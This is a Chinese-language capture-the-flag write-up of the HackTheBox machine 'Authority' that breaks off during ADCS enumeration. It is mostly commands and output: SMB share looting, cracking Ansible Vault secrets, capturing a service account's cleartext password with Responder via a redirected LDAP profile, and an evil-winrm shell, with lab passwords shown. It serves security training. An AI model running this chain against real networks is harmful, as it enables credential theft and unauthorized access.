---
title: HTB-AuthorityWriteup
date: 2026-11-03T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
  - Windows
  - LDAP
  - ADCS
  - ESC1
---
## Nmap 探测

使用 nmap 探测开放的 tcp 端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ sudo nmap --min-rate 10000 -p- 10.129.229.56 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-11-02 01:57 -0500
Warning: 10.129.229.56 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.229.56
Host is up (0.14s latency).
Not shown: 50956 closed tcp ports (reset), 14550 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8443/tcp  open  https-alt
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49686/tcp open  unknown
49696/tcp open  unknown
49701/tcp open  unknown
56426/tcp open  unknown
57294/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 50.69 seconds
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49671,49674,49675,49676,49686,49696,49701,56426,57294
```

对存活的端口进行详细信息扫描。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ sudo nmap -sT -sC -sV -O -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49671,49674,49675,49676,49686,49696,49701,56426,57294 10.129.229.56 -oA Nmap/details
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-11-02 02:00 -0500
Nmap scan report for 10.129.229.56
Host is up (0.48s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-02 10:59:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2026-11-02T11:01:13+00:00; +3h58m41s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2026-11-02T11:01:14+00:00; +3h58m41s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-02T11:01:13+00:00; +3h58m41s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2026-11-02T11:01:14+00:00; +3h58m41s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  h2
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2026-10-31T10:46:49
|_Not valid after:  2028-11-01T22:25:13
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
56426/tcp open  msrpc         Microsoft Windows RPC
57294/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2022 (93%), Windows Server 2019 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-11-02T11:00:58
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 3h58m40s, deviation: 0s, median: 3h58m40s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.26 seconds
```

将暴露出来的域名解析至 hosts 文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ tail -n 1 /etc/hosts
10.129.229.56 authority.htb authority.htb.corp htb.corp HTB
```

## PWN

打开 8443 端口的 WEB 界面，发现一个 PWN 应用。

![](Pasted%20image%2020261102153647.png)

以 guest 身份可以列举出 smb 共享文件，其中包含一个可读文件夹 Department。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ nxc smb 10.129.229.56 -u '' -p '' --shares
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\:
SMB         10.129.229.56   445    AUTHORITY        [-] Error enumerating shares: STATUS_ACCESS_DENIED
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ nxc smb 10.129.229.56 -u 'enil' -p '' --shares
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\enil: (Guest)
SMB         10.129.229.56   445    AUTHORITY        [*] Enumerated shares
SMB         10.129.229.56   445    AUTHORITY        Share           Permissions     Remark
SMB         10.129.229.56   445    AUTHORITY        -----           -----------     ------
SMB         10.129.229.56   445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.129.229.56   445    AUTHORITY        C$                              Default share
SMB         10.129.229.56   445    AUTHORITY        Department Shares
SMB         10.129.229.56   445    AUTHORITY        Development     READ
SMB         10.129.229.56   445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.129.229.56   445    AUTHORITY        NETLOGON                        Logon server share
SMB         10.129.229.56   445    AUTHORITY        SYSVOL                          Logon server share
```

连接 Department，将文件夹下载下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority/SMB]
└─$ smbclient //10.129.229.56/Development -U 'enil'
Password for [WORKGROUP\enil]:
Try "help" to get a list of possible commands.
smb: \> prompt on
smb: \> recurse off
smb: \> mget *
getting file \Automation\Ansible\ADCS\.ansible-lint of size 259 as Automation/Ansible/ADCS/.ansible-lint (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\.yamllint of size 205 as Automation/Ansible/ADCS/.yamllint (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\LICENSE of size 11364 as Automation/Ansible/ADCS/LICENSE (14.2 KiloBytes/sec) (average 5.3 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\README.md of size 7279 as Automation/Ansible/ADCS/README.md (11.0 KiloBytes/sec) (average 6.6 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\requirements.txt of size 466 as Automation/Ansible/ADCS/requirements.txt (1.0 KiloBytes/sec) (average 5.8 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\requirements.yml of size 264 as Automation/Ansible/ADCS/requirements.yml (0.5 KiloBytes/sec) (average 5.1 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\SECURITY.md of size 924 as Automation/Ansible/ADCS/SECURITY.md (1.9 KiloBytes/sec) (average 4.7 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\tox.ini of size 419 as Automation/Ansible/ADCS/tox.ini (0.4 KiloBytes/sec) (average 3.9 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\.travis.yml of size 1414 as Automation/Ansible/LDAP/.travis.yml (1.9 KiloBytes/sec) (average 3.7 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\README.md of size 5768 as Automation/Ansible/LDAP/README.md (10.6 KiloBytes/sec) (average 4.2 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\TODO.md of size 119 as Automation/Ansible/LDAP/TODO.md (0.2 KiloBytes/sec) (average 3.8 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\Vagrantfile of size 640 as Automation/Ansible/LDAP/Vagrantfile (1.0 KiloBytes/sec) (average 3.6 KiloBytes/sec)
getting file \Automation\Ansible\PWM\ansible.cfg of size 491 as Automation/Ansible/PWM/ansible.cfg (0.7 KiloBytes/sec) (average 3.4 KiloBytes/sec)
getting file \Automation\Ansible\PWM\ansible_inventory of size 174 as Automation/Ansible/PWM/ansible_inventory (0.2 KiloBytes/sec) (average 3.1 KiloBytes/sec)
getting file \Automation\Ansible\PWM\README.md of size 1290 as Automation/Ansible/PWM/README.md (1.8 KiloBytes/sec) (average 3.0 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\defaults\main.yml of size 1578 as Automation/Ansible/ADCS/defaults/main.yml (3.0 KiloBytes/sec) (average 3.0 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\meta\main.yml of size 549 as Automation/Ansible/ADCS/meta/main.yml (0.5 KiloBytes/sec) (average 2.8 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\meta\preferences.yml of size 22 as Automation/Ansible/ADCS/meta/preferences.yml (0.0 KiloBytes/sec) (average 2.7 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\tasks\assert.yml of size 2936 as Automation/Ansible/ADCS/tasks/assert.yml (4.7 KiloBytes/sec) (average 2.8 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\tasks\generate_ca_certs.yml of size 2262 as Automation/Ansible/ADCS/tasks/generate_ca_certs.yml (3.3 KiloBytes/sec) (average 2.8 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\tasks\init_ca.yml of size 1244 as Automation/Ansible/ADCS/tasks/init_ca.yml (1.3 KiloBytes/sec) (average 2.7 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\tasks\main.yml of size 1359 as Automation/Ansible/ADCS/tasks/main.yml (2.6 KiloBytes/sec) (average 2.7 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\tasks\requests.yml of size 4214 as Automation/Ansible/ADCS/tasks/requests.yml (7.3 KiloBytes/sec) (average 2.9 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\templates\extensions.cnf.j2 of size 1659 as Automation/Ansible/ADCS/templates/extensions.cnf.j2 (2.7 KiloBytes/sec) (average 2.9 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\templates\openssl.cnf.j2 of size 11294 as Automation/Ansible/ADCS/templates/openssl.cnf.j2 (18.9 KiloBytes/sec) (average 3.4 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\vars\main.yml of size 2146 as Automation/Ansible/ADCS/vars/main.yml (3.9 KiloBytes/sec) (average 3.4 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\.bin\clean_vault of size 677 as Automation/Ansible/LDAP/.bin/clean_vault (1.0 KiloBytes/sec) (average 3.3 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\.bin\diff_vault of size 357 as Automation/Ansible/LDAP/.bin/diff_vault (0.6 KiloBytes/sec) (average 3.3 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\.bin\smudge_vault of size 768 as Automation/Ansible/LDAP/.bin/smudge_vault (1.1 KiloBytes/sec) (average 3.2 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\defaults\main.yml of size 1046 as Automation/Ansible/LDAP/defaults/main.yml (1.3 KiloBytes/sec) (average 3.1 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\files\pam_mkhomedir of size 170 as Automation/Ansible/LDAP/files/pam_mkhomedir (0.3 KiloBytes/sec) (average 3.0 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\handlers\main.yml of size 277 as Automation/Ansible/LDAP/handlers/main.yml (0.2 KiloBytes/sec) (average 2.9 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\meta\main.yml of size 416 as Automation/Ansible/LDAP/meta/main.yml (0.5 KiloBytes/sec) (average 2.8 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\tasks\main.yml of size 5235 as Automation/Ansible/LDAP/tasks/main.yml (5.2 KiloBytes/sec) (average 2.9 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\templates\ldap_sudo_groups.j2 of size 131 as Automation/Ansible/LDAP/templates/ldap_sudo_groups.j2 (0.2 KiloBytes/sec) (average 2.8 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\templates\ldap_sudo_users.j2 of size 106 as Automation/Ansible/LDAP/templates/ldap_sudo_users.j2 (0.2 KiloBytes/sec) (average 2.8 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\templates\sssd.conf.j2 of size 2556 as Automation/Ansible/LDAP/templates/sssd.conf.j2 (3.9 KiloBytes/sec) (average 2.8 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\templates\sudo_group.j2 of size 30 as Automation/Ansible/LDAP/templates/sudo_group.j2 (0.0 KiloBytes/sec) (average 2.7 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\vars\debian.yml of size 174 as Automation/Ansible/LDAP/vars/debian.yml (0.3 KiloBytes/sec) (average 2.7 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\vars\main.yml of size 75 as Automation/Ansible/LDAP/vars/main.yml (0.1 KiloBytes/sec) (average 2.6 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\vars\redhat.yml of size 222 as Automation/Ansible/LDAP/vars/redhat.yml (0.3 KiloBytes/sec) (average 2.6 KiloBytes/sec)
getting file \Automation\Ansible\LDAP\vars\ubuntu-14.04.yml of size 203 as Automation/Ansible/LDAP/vars/ubuntu-14.04.yml (0.3 KiloBytes/sec) (average 2.5 KiloBytes/sec)
getting file \Automation\Ansible\PWM\defaults\main.yml of size 1591 as Automation/Ansible/PWM/defaults/main.yml (2.9 KiloBytes/sec) (average 2.5 KiloBytes/sec)
getting file \Automation\Ansible\PWM\handlers\main.yml of size 4 as Automation/Ansible/PWM/handlers/main.yml (0.0 KiloBytes/sec) (average 2.5 KiloBytes/sec)
getting file \Automation\Ansible\PWM\meta\main.yml of size 199 as Automation/Ansible/PWM/meta/main.yml (0.3 KiloBytes/sec) (average 2.4 KiloBytes/sec)
getting file \Automation\Ansible\PWM\tasks\main.yml of size 1832 as Automation/Ansible/PWM/tasks/main.yml (1.7 KiloBytes/sec) (average 2.4 KiloBytes/sec)
getting file \Automation\Ansible\PWM\templates\context.xml.j2 of size 422 as Automation/Ansible/PWM/templates/context.xml.j2 (0.6 KiloBytes/sec) (average 2.3 KiloBytes/sec)
getting file \Automation\Ansible\PWM\templates\tomcat-users.xml.j2 of size 388 as Automation/Ansible/PWM/templates/tomcat-users.xml.j2 (0.6 KiloBytes/sec) (average 2.3 KiloBytes/sec)
getting file \Automation\Ansible\SHARE\tasks\main.yml of size 1876 as Automation/Ansible/SHARE/tasks/main.yml (4.1 KiloBytes/sec) (average 2.3 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\molecule\default\converge.yml of size 106 as Automation/Ansible/ADCS/molecule/default/converge.yml (0.1 KiloBytes/sec) (average 2.3 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\molecule\default\molecule.yml of size 526 as Automation/Ansible/ADCS/molecule/default/molecule.yml (0.9 KiloBytes/sec) (average 2.3 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\molecule\default\prepare.yml of size 371 as Automation/Ansible/ADCS/molecule/default/prepare.yml (0.4 KiloBytes/sec) (average 2.2 KiloBytes/sec)
smb: \> exit
```

查看结构。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority/SMB]
└─$ tree
.
└── Automation
    └── Ansible
        ├── ADCS
        │   ├── defaults
        │   │   └── main.yml
        │   ├── LICENSE
        │   ├── meta
        │   │   ├── main.yml
        │   │   └── preferences.yml
        │   ├── molecule
        │   │   └── default
        │   │       ├── converge.yml
        │   │       ├── molecule.yml
        │   │       └── prepare.yml
        │   ├── README.md
        │   ├── requirements.txt
        │   ├── requirements.yml
        │   ├── SECURITY.md
        │   ├── tasks
        │   │   ├── assert.yml
        │   │   ├── generate_ca_certs.yml
        │   │   ├── init_ca.yml
        │   │   ├── main.yml
        │   │   └── requests.yml
        │   ├── templates
        │   │   ├── extensions.cnf.j2
        │   │   └── openssl.cnf.j2
        │   ├── tox.ini
        │   └── vars
        │       └── main.yml
        ├── LDAP
        │   ├── defaults
        │   │   └── main.yml
        │   ├── files
        │   │   └── pam_mkhomedir
        │   ├── handlers
        │   │   └── main.yml
        │   ├── meta
        │   │   └── main.yml
        │   ├── README.md
        │   ├── tasks
        │   │   └── main.yml
        │   ├── templates
        │   │   ├── ldap_sudo_groups.j2
        │   │   ├── ldap_sudo_users.j2
        │   │   ├── sssd.conf.j2
        │   │   └── sudo_group.j2
        │   ├── TODO.md
        │   ├── Vagrantfile
        │   └── vars
        │       ├── debian.yml
        │       ├── main.yml
        │       ├── redhat.yml
        │       └── ubuntu-14.04.yml
        ├── PWM
        │   ├── ansible.cfg
        │   ├── ansible_inventory
        │   ├── defaults
        │   │   └── main.yml
        │   ├── handlers
        │   │   └── main.yml
        │   ├── meta
        │   │   └── main.yml
        │   ├── README.md
        │   ├── tasks
        │   │   └── main.yml
        │   └── templates
        │       ├── context.xml.j2
        │       └── tomcat-users.xml.j2
        └── SHARE
            └── tasks
                └── main.yml

27 directories, 46 files
```

先看 `PWM/templates/tomcat-users.xml.j2` 模板，robot 的密码暴露出来了。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority/SMB]
└─$ cat Automation/Ansible/PWM/templates/tomcat-users.xml.j2
<?xml version='1.0' encoding='cp1252'?>

<tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
 version="1.0">

<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>
<user username="robot" password="T0mc@tR00t" roles="manager-script"/>

</tomcat-users>
```

`cat Automation/Ansible/PWM/defaults/main.yml` 中包含着三个 Ansible Vault 加密块，PWN 的登录名、密码、LDAP 都在其中。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority/SMB]
└─$ cat Automation/Ansible/PWM/defaults/main.yml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764                                                                                                                                                                      
```

保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority/SMB]
└─$ cat *
cat: Automation: Is a directory
$ANSIBLE_VAULT;1.1;AES256
63303831303534303266356462373731393561313363313038376166336536666232626461653630
3437333035366235613437373733316635313530326639330a643034623530623439616136363563
34646237336164356438383034623462323531316333623135383134656263663266653938333334
3238343230333633350a646664396565633037333431626163306531336336326665316430613566
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438
$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a363663623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531
```

分别用 ansible2john 保存成 john 能破解的格式。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority/SMB]
└─$ /usr/share/john/ansible2john.py ldap_admin_password.vault > ldap.vault.john
┌──(kali㉿kali)-[~/Work/Kali/Authority/SMB]
└─$ cat ldap.vault.john
ldap_admin_password.vault:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority/SMB]
└─$ /usr/share/john/ansible2john.py pwm_admin_login.vault > admin.vault.john
┌──(kali㉿kali)-[~/Work/Kali/Authority/SMB]
└─$ /usr/share/john/ansible2john.py pwm_admin_password.vault > admin_pass.vault.john
┌──(kali㉿kali)-[~/Work/Kali/Authority/SMB]
└─$ cat admin*
pwm_admin_password.vault:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
pwm_admin_login.vault:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
```

用 john 破解得到两个密钥 `!@#$%^&*`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority/SMB]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt *.vault.john
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (pwm_admin_password.vault)
!@#$%^&*         (pwm_admin_login.vault)
2g 0:00:28:23 96.66% (ETA: 03:35:17) 0.001173g/s 8150p/s 8197c/s 8197C/s 0799900014..0799623120
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

用它解开 `pwm_admin_password.vault` 得到密码 `pWm_@dm!N_!23`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ cat pw.txt
!@#$%^&*
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ ansible-vault view --vault-password-file pw.txt SMB/pwm_admin_password.vault
pWm_@dm!N_!23
```

用密码登录 Web。

![](Pasted%20image%2020261102172703.png)

修改 LDAP URLs 的地址为 Kali 地址。

![](Pasted%20image%2020261102173109.png)

点击 Test LDAP Profile。

![](Pasted%20image%2020261102173321.png)

本地启动 responder 监听，抓取到 svc_ldap 的口令。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.151]
    Responder IPv6             [fe80::f886:936:2983:b9d3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-FWLS5RV42FL]
    Responder Domain Name      [IELK.LOCAL]
    Responder DCE-RPC Port     [45947]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

[LDAP] Cleartext Client   : 10.129.229.56
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[LDAP] Cleartext Client   : 10.129.229.56
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[+] Exiting...
```

用 evil-winrm 登录得到 svc_ldap。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'          
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami
htb\svc_ldap
```

## 提权

用 certipy-ad 进行 ADCS 枚举。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Authority]
└─$ certipy-ad find -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
